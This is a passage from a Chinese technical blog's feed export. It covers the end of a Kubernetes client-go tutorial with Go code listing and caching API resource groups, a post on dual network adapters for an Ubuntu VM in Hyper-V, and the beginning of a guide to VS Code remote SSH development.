class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-string">&quot;k8s.io/apimachinery/pkg/runtime/schema&quot;</span><br><span class="hljs-string">&quot;k8s.io/client-go/discovery&quot;</span><br><span class="hljs-string">&quot;k8s.io/client-go/tools/clientcmd&quot;</span><br>)<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">@Author: ningan</span><br><span class="hljs-comment">@Desc: 通过DynamicClient列出Kubernetes API Server所支持的资源组、资源版本、资源信息</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-comment">// 1. 加载配置文件，生成config对象</span><br>config, err := clientcmd.BuildConfigFromFlags(<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;/root/.kube/config&quot;</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-built_in">panic</span>(err.Error())<br>&#125;<br><br><span class="hljs-comment">// 2. 通过kubeconfig配置信息实例化discoveryClient对象，这个对象是用于发现Kubernetes API Server所支持的资源组、资源版本、资源信息的客户端。</span><br>discoveryClient, err := discovery.NewDiscoveryClientForConfig(config)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-built_in">panic</span>(err.Error())<br>&#125;<br><br><span class="hljs-comment">// 3. 发送请求，获取GVR数据</span><br>_, apiResourcesList, err := discoveryClient.ServerGroupsAndResources()<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-built_in">panic</span>(err.Error())<br>&#125;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">1) ServerGroups负责获取gv数据</span><br><span class="hljs-comment">2) 然后调用fetchGroupVersionResources，且给这个方法传递gv参数，通过调用ServerResourcesForGroupVersion方法获取gv对应的Resource数据，同时返回一个map[gv]resourceList的数据格式</span><br><span class="hljs-comment">3) 处理map-&gt;slice，然后返回GCR slice</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">Kubernetes API Server暴露出/api和/apis接口。DiscoveryClient通过RESTClient分别请求/api和/apis接口，从而获取Kubernetes API Server所支持的资源组、资源版本、资源信息。核心实现位于：ServerGroupsAndResources-&gt;ServerGroups中</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-keyword">for</span> _, list := <span class="hljs-keyword">range</span> apiResourcesList &#123;<br>gv, err := schema.ParseGroupVersion(list.GroupVersion)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-built_in">panic</span>(err.Error())<br>&#125;<br><br><span class="hljs-keyword">for</span> _, resource := <span class="hljs-keyword">range</span> list.APIResources &#123;<br>fmt.Printf(<span class="hljs-string">&quot;name: %v, group: %v, version: %v\n&quot;</span>, resource.Name, gv.Group, gv.Version)<br>&#125;<br>&#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@master demo1]<span class="hljs-comment"># go run main.go</span><br>name: bindings, group: , version: v1<br>name: componentstatuses, group: , version: v1<br>name: configmaps, group: , version: v1<br>name: endpoints, group: , version: v1<br>name: events, group: , version: v1<br>name: limitranges, group: , version: v1<br>name: namespaces, group: , version: v1<br>name: namespaces/finalize, group: , version: v1<br>name: namespaces/status, group: , version: v1<br>name: nodes, group: , version: v1<br>name: nodes/proxy, group: , version: v1<br>name: nodes/status, group: , version: v1<br>name: persistentvolumeclaims, group: , version: v1<br>name: persistentvolumeclaims/status, group: , version: v1<br>name: persistentvolumes, group: , version: v1<br>name: persistentvolumes/status, group: , version: v1<br>name: pods, group: , version: v1<br>name: pods/attach, group: , version: v1<br>name: pods/binding, group: , version: v1<br>name: pods/eviction, group: , version: v1<br>name: pods/exec, group: , version: v1<br>name: pods/log, group: , version: v1<br>name: pods/portforward, group: , version: v1<br>name: pods/proxy, group: , version: v1<br>name: pods/status, group: , version: v1<br>name: podtemplates, group: , version: v1<br>name: replicationcontrollers, group: , version: v1<br>name: replicationcontrollers/scale, group: , version: v1<br>name: replicationcontrollers/status, group: , version: v1<br>name: resourcequotas, group: , version: v1<br>name: resourcequotas/status, group: , version: v1<br>name: secrets, group: , version: v1<br>name: serviceaccounts, group: , version: v1<br>name: services, group: , version: v1<br>name: services/proxy, group: , version: v1<br>name: services/status, group: , version: v1<br>name: apiservices, group: apiregistration.k8s.io, version: v1<br>name: apiservices/status, group: apiregistration.k8s.io, version: v1<br>name: apiservices, group: apiregistration.k8s.io, version: v1beta1<br>name: apiservices/status, group: apiregistration.k8s.io, version: v1beta1<br>name: ingresses, group: extensions, version: v1beta1<br>name: ingresses/status, group: extensions, version: v1beta1<br>name: controllerrevisions, group: apps, version: v1<br>name: daemonsets, group: apps, version: v1<br>name: daemonsets/status, group: apps, version: v1<br>name: deployments, group: apps, version: v1<br>name: deployments/scale, group: apps, version: v1<br>name: deployments/status, group: apps, version: v1<br>name: replicasets, group: apps, version: v1<br>name: replicasets/scale, group: apps, version: v1<br>name: replicasets/status, group: apps, version: v1<br>name: statefulsets, group: apps, version: v1<br>name: statefulsets/scale, group: apps, version: v1<br>name: statefulsets/status, group: apps, version: v1<br>name: events, group: events.k8s.io, version: v1<br>name: events, group: events.k8s.io, version: v1beta1<br>name: tokenreviews, group: authentication.k8s.io, version: v1<br>name: tokenreviews, group: authentication.k8s.io, version: v1beta1<br>name: localsubjectaccessreviews, group: authorization.k8s.io, version: v1<br>name: selfsubjectaccessreviews, group: authorization.k8s.io, version: v1<br>name: selfsubjectrulesreviews, group: authorization.k8s.io, version: v1<br>name: subjectaccessreviews, group: authorization.k8s.io, version: v1<br>name: localsubjectaccessreviews, group: authorization.k8s.io, version: v1beta1<br>name: selfsubjectaccessreviews, group: authorization.k8s.io, version: v1beta1<br>name: selfsubjectrulesreviews, group: authorization.k8s.io, version: v1beta1<br>name: subjectaccessreviews, group: authorization.k8s.io, version: v1beta1<br>name: horizontalpodautoscalers, group: autoscaling, version: v1<br>name: horizontalpodautoscalers/status, group: autoscaling, version: v1<br>name: horizontalpodautoscalers, group: autoscaling, version: v2beta1<br>name: horizontalpodautoscalers/status, group: autoscaling, version: v2beta1<br>name: horizontalpodautoscalers, group: autoscaling, version: v2beta2<br>name: horizontalpodautoscalers/status, group: autoscaling, version: v2beta2<br>name: <span class="hljs-built_in">jobs</span>, group: batch, version: v1<br>name: <span class="hljs-built_in">jobs</span>/status, group: batch, version: v1<br>name: cronjobs, group: batch, version: v1beta1<br>name: cronjobs/status, group: batch, version: v1beta1<br>name: certificatesigningrequests, group: certificates.k8s.io, version: v1<br>name: certificatesigningrequests/approval, group: certificates.k8s.io, version: v1<br>name: certificatesigningrequests/status, group: certificates.k8s.io, version: v1<br>name: certificatesigningrequests, group: certificates.k8s.io, version: v1beta1<br>name: certificatesigningrequests/approval, group: certificates.k8s.io, version: v1beta1<br>name: certificatesigningrequests/status, group: certificates.k8s.io, version: v1beta1<br>name: ingressclasses, group: networking.k8s.io, version: v1<br>name: ingresses, group: networking.k8s.io, version: v1<br>name: ingresses/status, group: networking.k8s.io, version: v1<br>name: networkpolicies, group: networking.k8s.io, version: v1<br>name: ingressclasses, group: networking.k8s.io, version: v1beta1<br>name: ingresses, group: networking.k8s.io, version: v1beta1<br>name: ingresses/status, group: networking.k8s.io, version: v1beta1<br>name: poddisruptionbudgets, group: policy, version: v1beta1<br>name: poddisruptionbudgets/status, group: policy, version: v1beta1<br>name: podsecuritypolicies, group: policy, version: v1beta1<br>name: clusterrolebindings, group: rbac.authorization.k8s.io, version: v1<br>name: clusterroles, group: rbac.authorization.k8s.io, version: v1<br>name: rolebindings, group: rbac.authorization.k8s.io, version: v1<br>name: roles, group: rbac.authorization.k8s.io, version: v1<br>name: clusterrolebindings, group: rbac.authorization.k8s.io, version: v1beta1<br>name: clusterroles, group: rbac.authorization.k8s.io, version: v1beta1<br>name: rolebindings, group: rbac.authorization.k8s.io, version: v1beta1<br>name: roles, group: rbac.authorization.k8s.io, version: v1beta1<br>name: csidrivers, group: storage.k8s.io, version: v1<br>name: csinodes, group: storage.k8s.io, version: v1<br>name: storageclasses, group: storage.k8s.io, version: v1<br>name: volumeattachments, group: storage.k8s.io, version: v1<br>name: volumeattachments/status, group: storage.k8s.io, version: v1<br>name: csidrivers, group: storage.k8s.io, version: v1beta1<br>name: csinodes, group: storage.k8s.io, version: v1beta1<br>name: storageclasses, group: storage.k8s.io, version: v1beta1<br>name: volumeattachments, group: storage.k8s.io, version: v1beta1<br>name: mutatingwebhookconfigurations, group: admissionregistration.k8s.io, version: v1<br>name: validatingwebhookconfigurations, group: admissionregistration.k8s.io, version: v1<br>name: mutatingwebhookconfigurations, group: admissionregistration.k8s.io, version: v1beta1<br>name: validatingwebhookconfigurations, group: admissionregistration.k8s.io, version: v1beta1<br>name: customresourcedefinitions, group: apiextensions.k8s.io, version: v1<br>name: customresourcedefinitions/status, group: apiextensions.k8s.io, version: v1<br>name: customresourcedefinitions, group: apiextensions.k8s.io, version: v1beta1<br>name: customresourcedefinitions/status, group: apiextensions.k8s.io, version: v1beta1<br>name: priorityclasses, group: scheduling.k8s.io, version: v1<br>name: priorityclasses, group: scheduling.k8s.io, version: v1beta1<br>name: leases, group: coordination.k8s.io, version: v1<br>name: leases, group: coordination.k8s.io, version: v1beta1<br>name: runtimeclasses, group: node.k8s.io, version: v1beta1<br>name: endpointslices, group: discovery.k8s.io, version: v1beta1<br>name: cukclusters, group: dubhe.welkin, version: v1alpha1<br>name: cukclusters/status, group: dubhe.welkin, version: v1alpha1<br>name: cuknodes, group: dubhe.welkin, version: v1alpha1<br>name: cuknodes/status, group: dubhe.welkin, version: v1alpha1<br>name: cuksets, group: dubhe.welkin, version: v1alpha1<br>name: cuksets/status, group: dubhe.welkin, version: v1alpha1<br>name: nodes, group: metrics.k8s.io, version: v1beta1<br>name: pods, group: metrics.k8s.io, version: v1beta1<br><br></code></pre></td></tr></table></figure><h3 id="将GVR缓存到本地"><a href="#将GVR缓存到本地" class="headerlink" title="将GVR缓存到本地"></a>将GVR缓存到本地</h3><p>可以发现，GVR数据其实是很少变动的，因此我们可以将GVR的数据缓存到本地，来减少Client与Apiserver交互。</p><p>在discovery&#x2F;cached中，有另外两个客户端是来实现将GVR数据缓存到本地文件中和内存中的，分别是CachedDiscoveryClient和memCacheClient。</p><p>平时管理集群的kubectl命令也是使用这种方式来使用GVR与APIServer交互的。</p><p>DiscoveryClient除了可以发现Kubernetes API Server所支持的资源组、资源版本、资源信息，还可以将这些信息存储到本地，用于本地缓存（cache），以减轻对Kubernetes API Server访问的压力。在运行Kubernetes组件的机器上，缓存信息默认存储与<del>&#x2F;.kube&#x2F;cache和</del>&#x2F;.kube&#x2F;http-cache下。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;time&quot;</span><br><br><span class="hljs-string">&quot;k8s.io/apimachinery/pkg/runtime/schema&quot;</span><br><span class="hljs-string">&quot;k8s.io/client-go/discovery/cached/disk&quot;</span><br><span class="hljs-string">&quot;k8s.io/client-go/tools/clientcmd&quot;</span><br>)<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">@Author: ningan</span><br><span class="hljs-comment">@Desc: 将GVR数据缓存到本地</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-comment">// 1. 加载配置文件，生成config对象</span><br>config, err := clientcmd.BuildConfigFromFlags(<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;/root/.kube/config&quot;</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-built_in">panic</span>(err.Error())<br>&#125;<br><br><span class="hljs-comment">// 2. 实例化客户端，本客户端负责将GVR数据缓存到本地文件中</span><br>cachedDiscoveryClient, err := disk.NewCachedDiscoveryClientForConfig(config, <span class="hljs-string">&quot;./cache/discovery&quot;</span>, <span class="hljs-string">&quot;./cache/http&quot;</span>, time.Minute*<span class="hljs-number">60</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-built_in">panic</span>(err.Error())<br>&#125;<br><br>_, apiResourcesList, err := cachedDiscoveryClient.ServerGroupsAndResources()<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-built_in">panic</span>(err.Error())<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">1) 先从缓存文件中找GVR数据，有则直接返回，没有则调用APIServer</span><br><span class="hljs-comment">2) 嗲用APIServer获取GVR数据</span><br><span class="hljs-comment">3) 将获取到的GVR数据缓存到本地，然后返回给客户端</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-keyword">for</span> _, list := <span class="hljs-keyword">range</span> apiResourcesList &#123;<br>gv, err := schema.ParseGroupVersion(list.GroupVersion)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-built_in">panic</span>(err.Error())<br>&#125;<br><br><span class="hljs-keyword">for</span> _, resource := <span class="hljs-keyword">range</span> list.APIResources &#123;<br>fmt.Printf(<span class="hljs-string">&quot;name: %v, group: %v, version: %v\n&quot;</span>, resource.Name, gv.Group, gv.Version)<br>&#125;<br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>执行go run main.go之后，确实生成了cache目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@master demo2]<span class="hljs-comment"># tree -L 2</span><br>.<br>├── cache<br>│   ├── discovery<br>│   └── http<br>└── main.go<br><br>3 directories, 1 file<br><br></code></pre></td></tr></table></figure><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>Kubernetes源码剖析 5.2节 Client客户端对象</p><p>b站视频：<a href="https://www.bilibili.com/video/BV11e4y197Ft/?spm_id_from=pageDriver&vd_source=504b7dbe5398664dd37d144b1bdfc0a1">Client-go实战教程</a></p>]]></content>
    
    
    <categories>
      
      <category>k8s</category>
      
    </categories>
    
    
    <tags>
      
      <tag>k8s</tag>
      
      <tag>client-go</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【网络成长记】(202207) hyperv中的ubuntu虚拟机双网卡设置</title>
    <link href="/2022/07/25/net/%E3%80%90%E7%BD%91%E7%BB%9C%E6%88%90%E9%95%BF%E8%AE%B0%E3%80%91(202207)%20hyperv%E4%B8%AD%E7%9A%84ubuntu%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%8F%8C%E7%BD%91%E5%8D%A1%E8%AE%BE%E7%BD%AE/"/>
    <url>/2022/07/25/net/%E3%80%90%E7%BD%91%E7%BB%9C%E6%88%90%E9%95%BF%E8%AE%B0%E3%80%91(202207)%20hyperv%E4%B8%AD%E7%9A%84ubuntu%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%8F%8C%E7%BD%91%E5%8D%A1%E8%AE%BE%E7%BD%AE/</url>
    
    <content type="html"><![CDATA[<h2 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h2><p>hyperv创建虚拟机的时候，默认用的是default switch，这个default switch生成的ipv4地址是变化的</p><h2 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h2><p>有一个不变的ipv4地址，方便ssh远程连接</p><p>同时还可以连接外网</p><h2 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h2><p>hyperv同时整两个网卡，一个网卡(新建一个内部的网卡)配置静态ip地址，一个网卡(default switch)用于连外网</p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220725233717830.png" alt="image-20220725233717830"></p><h3 id="主机网卡配置"><a href="#主机网卡配置" class="headerlink" title="主机网卡配置"></a>主机网卡配置</h3><p>default switch不做任何更改，使用默认配置，如下：</p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220726000455898.png" alt="image-20220726000455898"></p><p>新建的内部网卡，配置为自定义的东西</p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220726000604540.png" alt="image-20220726000604540"></p><h3 id="虚拟机网卡配置"><a href="#虚拟机网卡配置" class="headerlink" title="虚拟机网卡配置"></a>虚拟机网卡配置</h3><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220726000941694.png" alt="image-20220726000941694"></p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220726001702691.png" alt="image-20220726001702691"></p><p>eth0不做更改</p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220726001057558.png" alt="image-20220726001057558"></p><p>eth1改成自定义ip地址</p><p>为什么此处不写网关呢？因为不需要连接外网</p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220726001158509.png" alt="image-20220726001158509"></p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220726001316264.png" alt="image-20220726001316264"></p><p>成功用自己加的网卡对应的静态ip地址进行ssh连接，搞定！</p><p>此处，感谢小王的指导，比心！ 比♥</p><h1 id="——–2022-08-14——–"><a href="#——–2022-08-14——–" class="headerlink" title="——–2022.08.14——–"></a>——–2022.08.14——–</h1><h2 id="ubuntu18-04双网卡设置"><a href="#ubuntu18-04双网卡设置" class="headerlink" title="ubuntu18.04双网卡设置"></a>ubuntu18.04双网卡设置</h2><p>需要用两个profile</p><p>要不然这两个网卡就只有一个生效，不能同时生效</p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220814233149347.png" alt="image-20220814233149347"></p>]]></content>
    
    
    <categories>
      
      <category>net</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【虚拟机】(202207) hyperv中的ubuntu虚拟机双网卡设置</title>
    <link href="/2022/07/25/net/%E3%80%90%E8%99%9A%E6%8B%9F%E6%9C%BA%E3%80%91(202207)%20hyperv%E4%B8%AD%E7%9A%84ubuntu%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%8F%8C%E7%BD%91%E5%8D%A1%E8%AE%BE%E7%BD%AE/"/>
    <url>/2022/07/25/net/%E3%80%90%E8%99%9A%E6%8B%9F%E6%9C%BA%E3%80%91(202207)%20hyperv%E4%B8%AD%E7%9A%84ubuntu%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%8F%8C%E7%BD%91%E5%8D%A1%E8%AE%BE%E7%BD%AE/</url>
    
    <content type="html"><![CDATA[<h2 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h2><p>hyperv创建虚拟机的时候，默认用的是default switch，这个default switch生成的ipv4地址是变化的</p><h2 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h2><p>有一个不变的ipv4地址，方便ssh远程连接</p><p>同时还可以连接外网</p><h2 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h2><p>hyperv同时整两个网卡，一个网卡(新建一个内部的网卡)配置静态ip地址，一个网卡(default switch)用于连外网</p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220725233717830.png" alt="image-20220725233717830"></p><h3 id="主机网卡配置"><a href="#主机网卡配置" class="headerlink" title="主机网卡配置"></a>主机网卡配置</h3><p>default switch不做任何更改，使用默认配置，如下：</p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220726000455898.png" alt="image-20220726000455898"></p><p>新建的内部网卡，配置为自定义的东西</p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220726000604540.png" alt="image-20220726000604540"></p><h3 id="虚拟机网卡配置"><a href="#虚拟机网卡配置" class="headerlink" title="虚拟机网卡配置"></a>虚拟机网卡配置</h3><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220726000941694.png" alt="image-20220726000941694"></p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220726001702691.png" alt="image-20220726001702691"></p><p>eth0不做更改</p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220726001057558.png" alt="image-20220726001057558"></p><p>eth1改成自定义ip地址</p><p>为什么此处不写网关呢？因为不需要连接外网</p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220726001158509.png" alt="image-20220726001158509"></p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220726001316264.png" alt="image-20220726001316264"></p><p>成功用自己加的网卡对应的静态ip地址进行ssh连接，搞定！</p><p>此处，感谢小王的指导，比心！ 比♥</p><h1 id="——–2022-08-14——–"><a href="#——–2022-08-14——–" class="headerlink" title="——–2022.08.14——–"></a>——–2022.08.14——–</h1><h2 id="ubuntu18-04双网卡设置"><a href="#ubuntu18-04双网卡设置" class="headerlink" title="ubuntu18.04双网卡设置"></a>ubuntu18.04双网卡设置</h2><p>需要用两个profile</p><p>要不然这两个网卡就只有一个生效，不能同时生效</p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220814233149347.png" alt="image-20220814233149347"></p>]]></content>
    
    
    <categories>
      
      <category>net</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【vscode】Windows下如何使用VScode连接远程linux服务器进行远程开发</title>
    <link href="/2022/07/25/software/%E3%80%90%E9%9C%80%E8%A6%81%E6%94%B9%E6%97%B6%E9%97%B4%E3%80%91%E3%80%90vscode%E3%80%91Windows%E4%B8%8B%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8VScode%E8%BF%9E%E6%8E%A5%E8%BF%9C%E7%A8%8Blinux%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BF%9B%E8%A1%8C%E8%BF%9C%E7%A8%8B%E5%BC%80%E5%8F%91/"/>
    <url>/2022/07/25/software/%E3%80%90%E9%9C%80%E8%A6%81%E6%94%B9%E6%97%B6%E9%97%B4%E3%80%91%E3%80%90vscode%E3%80%91Windows%E4%B8%8B%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8VScode%E8%BF%9E%E6%8E%A5%E8%BF%9C%E7%A8%8Blinux%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BF%9B%E8%A1%8C%E8%BF%9C%E7%A8%8B%E5%BC%80%E5%8F%91/</url>
    
    <content type="html"><![CDATA[<p>release author: ningan123</p><p>release time: 2022-05-05</p><h2 id="1-先上手-成功连接"><a href="#1-先上手-成功连接" class="headerlink" title="1. 先上手-成功连接"></a>1. 先上手-成功连接</h2><h3 id="1-vscode下载安装所需插件：vscode中的remote-ssh插件"><a href="#1-vscode下载安装所需插件：vscode中的remote-ssh插件" class="headerlink" title="1.vscode下载安装所需插件：vscode中的remote-ssh插件"></a>1.vscode下载安装所需插件：vscode中的remote-ssh插件</h3><p><img src="https://img-blog.csdnimg.cn/3b127ff942f64d9cba9a926ae897847c.png" alt="img"></p><p>安装之后，就会出现上图黄色所示的图标</p><h3 id="2-点击远程图标中的配置按钮，选择config文件"><a href="#2-点击远程图标中的配置按钮，选择config文件" class="headerlink" title="2.点击远程图标中的配置按钮，选择config文件"></a>2.点击远程图标中的配置按钮，选择config文件</h3><p><img src="https://img-blog.csdnimg.cn/88b2ecaacca4469cad2f1c0ed547f6d3.png" alt="在这里插入图片描述"></p><h3 id="3-配置config文件"><a href="#3-配置config文件" class="headerlink" title="3.配置config文件"></a>3.配置config文件</h3><p><img src="https://img-blog.csdnimg.cn/97880d2fc46749dd9f00248e88db9854.png" alt="在这里插入图片描述"></p><p>Host部分输入服务器的外号（如“test”）<br>HostName部分输入服务器的地址<br>User部分输入用户的名称</p><p>config文件中写的Host名称test就会显示在最左侧。</p><p><img src="https://img-blog.csdnimg.cn/31e20e20cd04429b8d232bffb40b9c61.png" alt="在这里插入图片描述"></p><h3 id="4-新建窗口连接"><a href="#4-新建窗口连接" class="headerlink" 